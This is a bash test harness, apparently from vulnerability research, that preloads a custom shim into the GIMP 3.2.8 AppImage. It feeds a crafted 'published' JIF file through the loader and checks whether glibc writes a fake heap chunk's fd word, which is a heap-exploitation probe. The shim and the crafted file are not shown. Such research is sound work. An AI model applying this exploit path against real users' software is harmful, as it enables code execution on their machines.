#!/usr/bin/env bash
# Live-plugin patch probe: preload patch-shim.c into the real GIMP 3.2.8
# AppImage, feed the published wrapped JIF through gimp-file-load, and check
# whether the post-inflate patch executes and whether glibc later writes the
# shim-arranged fake chunk's fd word. No plugin source is modified.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
[ -x "$ROOT/AppRun" ] || { echo "extracted AppImage missing" >&2; exit 1; }
"$ROOT/AppRun" --version | grep -q '3.2.8' \
  && ok "extracted runtime reports GIMP 3.2.8" || no "runtime version"

gcc -shared -fPIC -O2 -o "$HERE/patch-shim.so" "$HERE/patch-shim.c" -ldl \
  && ok "post-inflate patch shim built" || no "patch shim build"

ARPATCH="$ROOT/AppRun.new"
INSERTED=0
: > "$ARPATCH"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *inflate-shim.so*|*patch-shim.so*) continue ;;
    exec*org.gimp.GIMP.Stable*)
      if [ "$INSERTED" -eq 0 ]; then
        printf 'export LD_PRELOAD="$LD_PRELOAD:%s"\n' "$HERE/patch-shim.so" >> "$ARPATCH"
        INSERTED=1
      fi
      ;;
  esac
  printf '%s\n' "$line" >> "$ARPATCH"
done < "$ROOT/AppRun"
[ "$INSERTED" -eq 1 ] || { echo "AppRun exec line not found" >&2; exit 1; }
mv "$ARPATCH" "$ROOT/AppRun"
chmod +x "$ROOT/AppRun"
ok "AppRun patched locally (outside Git) to preload patch shim"

run_jif () {
  local file="$1" out="$2" rc=0
  local home; home="$(mktemp -d /tmp/gimpjif-patchhome-XXXXXX)"
  (cd "$ROOT" && timeout -k 5 90 env HOME="$home" ./AppRun -i \
      --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 || rc=$?
  echo "RUN_RC=$rc" >> "$out"
  ps -u "$(id -u)" -o pid,args | grep -F "$ROOT" | grep 'org.gimp.GIMP.Stable -i' \
    | grep -v grep | awk '{print $1}' | xargs -r kill -9 || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
PUB="$BASE/realglib/evidence/published.jif"
run_jif "$SAFE" "$EVID/appimage-patch-safe.log"
run_jif "$PUB" "$EVID/appimage-patch-published.log"

! grep -q '^SHIM_PATCH ' "$EVID/appimage-patch-safe.log" \
  && ok "safe 4x4 input makes no patch call" || no "safe patch control"
grep -q '^SHIM_PATCH pid=' "$EVID/appimage-patch-published.log" \
  && ok "real plugin executed the post-inflate patch" || no "live patch call"
grep -q 'total_out=324' "$EVID/appimage-patch-published.log" \
  && ok "patch saw 324 inflated bytes" || no "patch byte count"

WORD_BEFORE=$(grep '^SHIM_PATCH_WORDS=' "$EVID/appimage-patch-published.log" \
  | head -1 | cut -d= -f2 | cut -c17-32)
WORD_AFTER=$(grep '^SHIM_FAKE_EXIT=' "$EVID/appimage-patch-published.log" \
  | head -1 | cut -d= -f2 | cut -c1-16)
if [ -n "$WORD_AFTER" ]; then
  ok "plugin reached normal exit with fake word dumped"
else
  echo "UNKNOWN: no normal-exit dump; attacker run may have been killed"
fi
if [ -n "$WORD_BEFORE" ] && [ -n "$WORD_AFTER" ]; then
  [ "$WORD_BEFORE" != "$WORD_AFTER" ] \
    && ok "glibc rewrote the shim-arranged fake fd word in the live plugin" \
    || echo "UNKNOWN: fake fd word unchanged at exit; no live consumer observed"
fi

echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
